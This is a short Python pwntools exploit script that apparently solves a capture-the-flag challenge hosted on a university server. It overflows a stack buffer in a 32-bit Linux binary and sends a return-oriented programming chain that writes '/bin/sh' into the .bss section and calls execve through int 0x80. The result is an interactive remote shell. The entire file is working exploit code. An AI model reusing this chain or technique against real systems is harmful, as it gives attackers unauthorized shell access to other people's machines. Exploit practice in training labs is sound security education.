from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

# P = process('./bin')
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10103)
#P = gdb.debug('./bin')
#input("Attach gdb")
elf = ELF("./bin")

sBuffer = 0xffffcd90
sRip = 0xffffce1c
offset = sRip - sBuffer

# 0x080639ad : syscall
syscall = 0x080639ad
# 0x080481d1 : pop ebx ; ret
popEbx = 0x080481d1

# 0x08070061 : pop ecx ; pop ebx ; ret
popEcxPopEbx = 0x08070061

# 0x0807003a : pop edx ; ret
popEdx = 0x0807003a

#0x08055a3b : mov dword ptr [edx], eax ; ret
movDwordPtrEdxEax = 0x08055a3b

# 0x080b9636 : pop eax ; ret
popEax = 0x080b9636

# 0x0806dc15 : int 0x80
int0x80 = 0x0806dc15

#/bin/sh
shell1 = b"/bin"
shell2 = b"/sh\x00"

# 0x080eb060 - 0x080ebf80 is .data
# 0x080ebf80 - 0x080ecd8c is .bss
bssAddr = 0x080ebf80

payload = b"A"*offset
payload += p32(popEdx) + p32(bssAddr) + p32(popEax) + shell1 + p32(movDwordPtrEdxEax)
payload += p32(popEdx) + p32(bssAddr + 4) + p32(popEax) + shell2 + p32(movDwordPtrEdxEax)
payload += p32(popEcxPopEbx) + p32(0) + p32(bssAddr) + p32(popEdx) + p32(0) + p32(popEax) + p32(0xb) + p32(int0x80)
P.send(payload)
P.interactive()